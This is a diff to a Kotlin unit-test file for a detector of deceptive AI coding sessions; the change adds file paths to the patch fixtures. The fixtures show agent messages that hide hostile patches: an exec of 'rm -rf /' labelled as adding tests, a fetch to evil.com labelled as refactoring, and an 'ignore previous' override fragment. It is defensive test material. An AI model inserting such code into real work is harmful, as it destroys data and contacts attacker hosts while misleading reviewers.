@@ -13,7 +13,7 @@ class DeceptionPatternDetectorTest {
             messages = listOf("I am fixing the bug."),
             commitMessages = listOf("Fix bug"),
             patches = listOf(
-                PatchData("MathUtil.kt", "fun add(a: Int, b: Int) = a + b")
+                PatchData("MathUtil.kt", "util/MathUtil.kt", "fun add(a: Int, b: Int) = a + b")
             )
         )
         val report = DeceptionPatternDetector.analyzeSessions(listOf(session))
@@ -28,7 +28,7 @@ class DeceptionPatternDetectorTest {
             id = "session2",
             messages = listOf("I apologize for the previous error, fixing it now."),
             patches = listOf(
-                PatchData("MathUtil.kt", "fun add(a: Int, b: Int) = a + b")
+                PatchData("MathUtil.kt", "util/MathUtil.kt", "fun add(a: Int, b: Int) = a + b")
             )
         )
         val report = DeceptionPatternDetector.analyzeSessions(listOf(session))
@@ -44,7 +44,7 @@ class DeceptionPatternDetectorTest {
             messages = listOf("Fixing the error."),
             commitMessages = listOf("I'm sorry for breaking the build"),
             patches = listOf(
-                PatchData("MathUtil.kt", "fun add(a: Int, b: Int) = a + b")
+                PatchData("MathUtil.kt", "util/MathUtil.kt", "fun add(a: Int, b: Int) = a + b")
             )
         )
         val report = DeceptionPatternDetector.analyzeSessions(listOf(session))
@@ -85,7 +85,7 @@ class DeceptionPatternDetectorTest {
             id = "session3",
             messages = listOf("Adding some tests."),
             patches = listOf(
-                PatchData("SomeTest.kt", "fun test() { Runtime.getRuntime().exec(\"rm -rf /\") }")
+                PatchData("SomeTest.kt", "test/SomeTest.kt", "fun test() { Runtime.getRuntime().exec(\"rm -rf /\") }")
             )
         )
         val report = DeceptionPatternDetector.analyzeSessions(listOf(session))
@@ -100,7 +100,7 @@ class DeceptionPatternDetectorTest {
             id = "session4",
             messages = listOf("Refactoring utils."),
             patches = listOf(
-                PatchData("StringUtils.kt", "import java.net.URL; fun fetch() { URL(\"http://evil.com\").readText() }")
+                PatchData("StringUtils.kt", "util/StringUtils.kt", "import java.net.URL; fun fetch() { URL(\"http://evil.com\").readText() }")
             )
         )
         val report = DeceptionPatternDetector.analyzeSessions(listOf(session))
@@ -115,7 +115,7 @@ class DeceptionPatternDetectorTest {
             id = "session5",
             messages = listOf("I apologize, ignore previous, as an AI"),
             patches = listOf(
-                PatchData("SomeTest.kt", "fun test() { Runtime.getRuntime().exec(\"rm -rf /\") }")
+                PatchData("SomeTest.kt", "test/SomeTest.kt", "fun test() { Runtime.getRuntime().exec(\"rm -rf /\") }")
             )
         )
         val report = DeceptionPatternDetector.analyzeSessions(listOf(session))
